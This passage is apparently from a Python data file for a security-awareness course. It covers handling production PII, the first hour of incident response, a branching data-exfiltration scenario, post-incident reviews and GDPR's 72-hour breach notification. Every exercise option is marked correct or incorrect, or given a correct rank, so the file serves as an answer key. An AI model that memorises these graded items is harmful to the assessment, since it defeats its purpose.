                                            "and most data protection frameworks, unauthorized copies of "
                                            "personal data on local devices must be reported as incidents."
                                        ),
                                    },
                                    {
                                        "label": "Download just a small subset of records (100 rows) to minimize the risk",
                                        "correct": False,
                                        "explanation": (
                                            "The number of records doesn't change the compliance violation. "
                                            "One record of real PII on an unauthorized device is still a "
                                            "policy violation. Under GDPR, even a single person's data "
                                            "being improperly handled can trigger reporting requirements."
                                        ),
                                    },
                                    {
                                        "label": "Agree, but delete the data immediately after testing and clear your local database",
                                        "correct": False,
                                        "explanation": (
                                            "Deletion after use doesn't undo the violation. The data was "
                                            "on an unauthorized system for a period of time, which is itself "
                                            "the breach. Additionally, 'deleting' database files doesn't "
                                            "guarantee the data is unrecoverable from disk."
                                        ),
                                    },
                                ],
                                "tool_used": None,
                                "result": None,
                            },
                        ],
                        "insight": (
                            "The pressure to 'just use production data' is one of the most common "
                            "security temptations in engineering. The right answer is almost always "
                            "anonymized data -- it preserves the patterns you need for debugging while "
                            "eliminating compliance risk. Never store production PII on local machines, "
                            "even temporarily."
                        ),
                    },
                },
            ],
        },
        # ── Module 3: Incident Response & Your Role ─────────────────
        {
            "position": 3,
            "title": "Incident Response & Your Role",
            "subtitle": "What to do in the first 60 minutes of a security incident",
            "estimated_time": "20 min",
            "objectives": [
                "Follow your organization's incident response procedure correctly",
                "Know what to report, to whom, and when",
                "Avoid common mistakes that make incidents worse",
                "Understand post-incident review and continuous improvement",
            ],
            "steps": [
                # Step 1 -- concept (incident response framework)
                {
                    "position": 1,
                    "title": "The Golden Hour: Incident Response Basics",
                    "step_type": "concept",
                    "exercise_type": None,
                    "content": """
<h2>When Seconds Count</h2>

<p>The average time for an attacker to move laterally after initial access is
<strong>1 hour 58 minutes</strong> (CrowdStrike 2023). That means the first actions
you take after discovering a potential breach directly determine whether the incident
stays contained or becomes catastrophic.</p>

<h3>The Incident Response Lifecycle</h3>
<ol>
  <li><strong>Detection & Identification</strong> -- recognizing that something is wrong. This could be an alert from monitoring, unusual behavior you observe, a report from a colleague, or notification from an external party.</li>
  <li><strong>Containment</strong> -- stopping the bleeding. Isolate affected systems, revoke compromised credentials, block malicious IPs. The goal is to prevent further damage without destroying evidence.</li>
  <li><strong>Eradication</strong> -- removing the threat. Patch the vulnerability, remove malware, close unauthorized access paths.</li>
  <li><strong>Recovery</strong> -- restoring normal operations. Bring systems back online, verify integrity, monitor for recurrence.</li>
  <li><strong>Post-Incident Review</strong> -- the most undervalued phase. What happened? Why? What do we change to prevent it? No blame, only learning.</li>
</ol>

<h3>Your Role as an Engineer</h3>
<p>You are not expected to be a security incident commander. But you are expected to:</p>
<ul>
  <li><strong>Recognize</strong> -- know what "suspicious" looks like in the systems you own</li>
  <li><strong>Report immediately</strong> -- to your security team's incident channel (Slack, PagerDuty, email). Never try to investigate or fix it alone first.</li>
  <li><strong>Preserve evidence</strong> -- don't reboot servers, delete logs, or "clean up" before the security team arrives. Every action you take may destroy forensic evidence.</li>
  <li><strong>Contain if safe</strong> -- if you know how to isolate an affected system without causing a larger outage, do it. If you're not sure, wait for guidance.</li>
  <li><strong>Communicate accurately</strong> -- report what you observed factually. "I saw 50,000 API calls from a single IP in 5 minutes" is useful. "I think we're hacked" is not.</li>
</ul>

<h3>When to Report: The Decision Is Simple</h3>
<p><strong>If you're wondering whether you should report something, report it.</strong></p>
<p>False alarms are free. Unreported incidents are not. Your security team would
rather triage 100 false positives than miss one real breach. Common things to report:</p>
<ul>
  <li>Unexpected login alerts or MFA prompts you didn't initiate</li>
  <li>Emails asking for credentials, even if they look legitimate</li>
  <li>Unusual system behavior -- unexpected processes, performance degradation, files you didn't create</li>
  <li>Colleagues sharing credentials or working around security controls</li>
  <li>Lost or stolen devices (laptops, phones, USB drives)</li>
  <li>Accidental exposure of secrets, PII, or confidential data</li>
</ul>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": None,
                },
                # Step 2 -- scenario_branch (discovering a breach)
                {
                    "position": 2,
                    "title": "Something Doesn't Look Right",
                    "step_type": "exercise",
                    "exercise_type": "scenario_branch",
                    "content": """
<p>You're working late when you notice something unusual. Walk through
this scenario step by step.</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": {
                        "scenario": (
                            "It's 11 PM and you're deploying a hotfix. While checking application "
                            "logs, you notice something strange: there are hundreds of database queries "
                            "running against the customers table from a service account that shouldn't "
                            "have access to that table. The queries are running SELECT * with no WHERE "
                            "clause -- it looks like someone is dumping the entire table. The queries "
                            "started 45 minutes ago and are still running."
                        ),
                        "steps": [
                            {
                                "question": "You're seeing what appears to be an active data exfiltration from the customers table. What is your first action?",
                                "options": [
                                    {
                                        "label": "Immediately alert the security team through your incident response channel (Slack, PagerDuty, or phone) with exactly what you're seeing: the service account name, the query pattern, the table being accessed, and the timeframe",
                                        "correct": True,
                                        "explanation": (
                                            "Correct. Your first action is always to report. You're providing "
                                            "specific, actionable details that the security team needs to "
                                            "assess severity and begin response. Don't waste time investigating "
                                            "further before alerting -- the 45 minutes already elapsed means "
                                            "every additional minute of delay matters."
                                        ),
                                    },
                                    {
                                        "label": "Kill the database queries and revoke the service account's access to stop the data loss immediately",
                                        "correct": False,
                                        "explanation": (
                                            "While containment is important, acting unilaterally without "
                                            "alerting the security team first can destroy forensic evidence "
                                            "(active connections, process trees, memory artifacts). It can "
                                            "also alert the attacker that they've been detected, causing "
                                            "them to switch to backup access methods or destroy evidence. "
                                            "Alert first, then contain with guidance."
                                        ),
                                    },
                                    {
                                        "label": "Investigate further to make sure it's not a legitimate batch job or migration script before raising a false alarm",
                                        "correct": False,
                                        "explanation": (
                                            "Never delay reporting to investigate. During an active "
                                            "exfiltration, every minute of investigation delay is a minute "
                                            "of data loss. If it turns out to be a legitimate batch job, "
                                            "the security team will close the incident in minutes. A false "
                                            "alarm costs nothing; a delayed response to a real breach costs "
                                            "everything."
                                        ),
                                    },
                                ],
                                "tool_used": None,
                                "result": None,
                            },
                            {
                                "question": "You've alerted the security team. They're assembling but are 15 minutes out. The queries are still running. The security team asks you: 'Can you safely contain this without disrupting other services?' What do you do?",
                                "options": [
                                    {
                                        "label": "Revoke the compromised service account's permissions on the customers table specifically, while leaving its other permissions intact to minimize blast radius to other services",
                                        "correct": True,
                                        "explanation": (
                                            "This is targeted containment. You're stopping the data "
                                            "exfiltration without causing a wider outage. By only revoking "
                                            "access to the affected table (rather than deleting the service "
                                            "account entirely), you preserve forensic evidence and minimize "
                                            "collateral damage to other services that may depend on this account."
                                        ),
                                    },
                                    {
                                        "label": "Shut down the entire database to ensure no data can be exfiltrated",
                                        "correct": False,
                                        "explanation": (
                                            "This is disproportionate containment. Shutting down the entire "
                                            "database stops the exfiltration but also causes a complete "
                                            "service outage affecting all users. Targeted containment (revoking "
                                            "specific permissions) achieves the same protective goal without "
                                            "the collateral damage."
                                        ),
                                    },
                                    {
                                        "label": "Wait for the security team to arrive -- you don't want to make things worse by touching production systems during an active incident",
                                        "correct": False,
                                        "explanation": (
                                            "The security team explicitly asked you to contain if you can do "
                                            "it safely. Waiting 15 minutes while data is actively being "
                                            "exfiltrated means potentially thousands more customer records "
                                            "are compromised. When you have the expertise and explicit "
                                            "authorization, act."
                                        ),
                                    },
                                ],
                                "tool_used": None,
                                "result": None,
                            },
                            {
                                "question": "The incident has been contained and the security team has taken over. A colleague on another team Slacks you: 'Hey, I heard something happened with the customer database tonight -- what's going on? Should I be worried about my services?' How do you respond?",
                                "options": [
                                    {
                                        "label": "Tell them you can't share details about an active security investigation, and direct them to the security team's official communication channel for any updates that affect their services",
                                        "correct": True,
                                        "explanation": (
                                            "Correct. During an active incident, information must flow through "
                                            "official channels. Sharing details informally -- even with well-meaning "
                                            "colleagues -- can lead to inaccurate information spreading, panic, "
                                            "premature public disclosure, or tipping off an insider threat. The "
                                            "security team will communicate what needs to be known, when it needs "
                                            "to be known."
                                        ),
                                    },
                                    {
                                        "label": "Give them a high-level summary since they might need to check their own services for similar issues",
                                        "correct": False,
                                        "explanation": (
                                            "Even high-level details can be damaging during an active investigation. "
                                            "If the colleague's services need to be checked, the security team "
                                            "will reach out to them directly with specific guidance. Your 'high-level "
                                            "summary' could end up in a screenshot shared more widely than intended."
                                        ),
                                    },
                                    {
                                        "label": "Tell them everything is fine and it was just a false alarm to avoid causing unnecessary worry",
                                        "correct": False,
                                        "explanation": (
                                            "Never provide false information about a security incident. If the "
                                            "colleague's services are affected and they don't take precautions "
                                            "because you told them it was a false alarm, you've actively "
                                            "contributed to a worse outcome. Redirect to official channels instead."
                                        ),
                                    },
                                ],
                                "tool_used": None,
                                "result": None,
                            },
                        ],
                        "insight": (
                            "The three pillars of incident response for engineers: (1) Report immediately "
                            "with specific, factual details -- don't investigate first. (2) Contain "
                            "proportionally when authorized -- targeted actions, not nuclear options. "
                            "(3) Control information flow -- all communication goes through official "
                            "channels during an active incident."
                        ),
                    },
                },
                # Step 3 -- ordering (reporting timeline)
                {
                    "position": 3,
                    "title": "Incident Reporting: The Correct Sequence",
                    "step_type": "exercise",
                    "exercise_type": "ordering",
                    "content": """
<p>A security incident has been detected. Arrange these reporting and
documentation steps in the correct order. Getting the sequence wrong
can compromise evidence or miss regulatory deadlines.</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": {
                        "instruction": "Arrange these incident reporting steps in the correct order:",
                        "items": [
                            {
                                "id": "a",
                                "text": "Alert the security team immediately via the designated incident channel with factual details: what you found, what systems are affected, and the timeframe",
                                "correct_position": 1,
                            },
                            {
                                "id": "b",
                                "text": "Preserve all evidence -- do NOT reboot systems, rotate logs, or 'clean up' anything that might contain forensic artifacts",
                                "correct_position": 2,
                            },
                            {
                                "id": "c",
                                "text": "Document your observations in writing while they're fresh: timestamps, error messages, system states, and every action you took",
                                "correct_position": 3,
                            },
                            {
                                "id": "d",
                                "text": "Contain the incident if you can do so safely and with authorization -- isolate affected systems, revoke compromised credentials",
                                "correct_position": 4,
                            },
                            {
                                "id": "e",
                                "text": "Assist the security team's investigation by answering questions about the system's architecture, normal behavior, and recent changes",
                                "correct_position": 5,
                            },
                            {
                                "id": "f",
                                "text": "Participate in the blameless post-incident review to identify root cause, systemic failures, and preventive measures",
                                "correct_position": 6,
                            },
                        ],
                    },
                },
                # Step 4 -- sjt (post-incident review)
                {
                    "position": 4,
                    "title": "The Post-Incident Review",
                    "step_type": "exercise",
                    "exercise_type": "sjt",
                    "content": """
<p>The breach has been contained. Now comes the most important part:
making sure it doesn't happen again. Rank these approaches to the
post-incident review from <strong>BEST (1)</strong> to <strong>WORST (4)</strong>.</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": {
                        "scenario": (
                            "The security incident from the previous scenario has been resolved. "
                            "The root cause was a service account that was provisioned with overly "
                            "broad database permissions 18 months ago during a migration project. "
                            "The migration team lead (who has since moved to another team) created "
                            "the account with admin-level access 'temporarily' and it was never "
                            "scoped down. An attacker compromised the account through a leaked "
                            "credential in a deprecated internal wiki page. 2,300 customer records "
                            "were accessed. Your VP of Engineering has called a post-incident review."
                        ),
                        "instruction": "Rank these approaches to the post-incident review from BEST (1) to WORST (4):",
                        "options": [
                            {
                                "id": "a",
                                "text": "Focus the review on systemic failures: why did the provisioning process allow admin-level service accounts without expiry? Why wasn't the deprecated wiki purged of credentials? Identify process changes, automated checks, and tooling improvements to prevent recurrence.",
                                "correct_rank": 1,
                                "explanation": (
                                    "This is the ideal approach -- blameless, systemic, and forward-looking. "
                                    "It treats the incident as a learning opportunity and focuses on the "
                                    "organizational and process failures that allowed the conditions for the "
                                    "breach. Automated checks (least-privilege audits, credential scanning in "
                                    "wikis) address root causes rather than symptoms."
                                ),
                            },
                            {
                                "id": "b",
                                "text": "Create a detailed timeline and share it broadly so the entire engineering org can learn from it. Publish the review findings in an internal blog post with specific technical details.",
                                "correct_rank": 2,
                                "explanation": (
                                    "Transparency and organizational learning are valuable, but sharing "
                                    "specific technical details of how the breach occurred (the wiki page, "
                                    "the service account, the exact access method) could expose the "
                                    "organization to further risk if the information leaks externally. "
                                    "Share lessons learned broadly, but limit technical specifics to "
                                    "need-to-know audiences."
                                ),
                            },
                            {
                                "id": "c",
                                "text": "Identify that the migration team lead created the overly permissioned account and ensure their current manager is aware so this kind of shortcut is addressed in their performance review.",
                                "correct_rank": 4,
                                "explanation": (
                                    "This is the worst approach. Blame-oriented reviews create a culture "
                                    "where people hide mistakes instead of reporting them. The team lead "
                                    "made a decision 18 months ago that wasn't caught by any process or "
                                    "review. The system failed, not one individual. Blameless post-mortems "
                                    "are an industry best practice for exactly this reason."
                                ),
                            },
                            {
                                "id": "d",
                                "text": "Immediately audit all service accounts across the organization for least-privilege compliance before conducting the formal review. Fix first, review later.",
                                "correct_rank": 3,
                                "explanation": (
                                    "The instinct to fix immediately is understandable, but rushing to "
                                    "remediate without a structured review can miss the deeper systemic "
                                    "issues. A hasty audit might fix this specific vector but miss the "
                                    "fact that your wiki still contains credentials, or that your "
                                    "provisioning process has no expiry enforcement. Fix urgently, but "
                                    "review thoroughly."
                                ),
                            },
                        ],
                        "scoring": "full_match=10, off_by_one=7, off_by_two=4, off_by_three=0",
                    },
                },
                # Step 5 -- mcq (reporting obligations)
                {
                    "position": 5,
                    "title": "Knowledge Check: Reporting Obligations",
                    "step_type": "exercise",
                    "exercise_type": "mcq",
                    "content": """
<p>Understanding when and how to report is critical. Not just for compliance
-- but because delays in reporting directly correlate with breach severity.</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": {
                        "question": "Under GDPR, what is the maximum time allowed to notify the supervisory authority after becoming aware of a personal data breach that poses a risk to individuals' rights?",
                        "options": [
                            {
                                "text": "24 hours",
                                "correct": False,
                                "explanation": (
                                    "Some regulations (like India's CERT-In directive) require 24-hour "
                                    "reporting for certain incidents, but GDPR's requirement is 72 hours. "
                                    "However, many organizations set internal reporting deadlines shorter "
                                    "than the regulatory requirement to allow time for assessment."
                                ),
                            },
                            {
                                "text": "72 hours",
                                "correct": True,
                                "explanation": (
                                    "Correct. GDPR Article 33 requires notification to the supervisory "
                                    "authority within 72 hours of becoming aware of a personal data breach, "
                                    "where feasible. If notification is delayed beyond 72 hours, the "
                                    "organization must provide a reasoned justification. This is why "
                                    "internal reporting must happen immediately -- every hour of internal "
                                    "delay eats into the 72-hour regulatory window."
                                ),
                            },
                            {
                                "text": "7 calendar days",
                                "correct": False,
                                "explanation": (
                                    "7 days is too long under GDPR. Some sector-specific regulations "
                                    "may allow longer windows, but GDPR's 72-hour requirement applies "
                                    "to all organizations processing EU residents' personal data. The "
                                    "clock starts when you become 'aware' of the breach, not when you "
                                    "complete your investigation."
                                ),
                            },
                            {
                                "text": "There is no specific deadline -- report as soon as reasonably practicable",
                                "correct": False,
                                "explanation": (
                                    "GDPR is explicit about the 72-hour deadline. 'As soon as "
                                    "reasonably practicable' is the standard used by some other "
                                    "frameworks, but not GDPR. The specificity of the 72-hour window "
                                    "is intentional -- it forces organizations to have reporting "
                                    "processes ready before a breach occurs."
                                ),
                            },
                        ],
                    },
                    "demo_data": None,
                },
            ],
        },
    ],
}
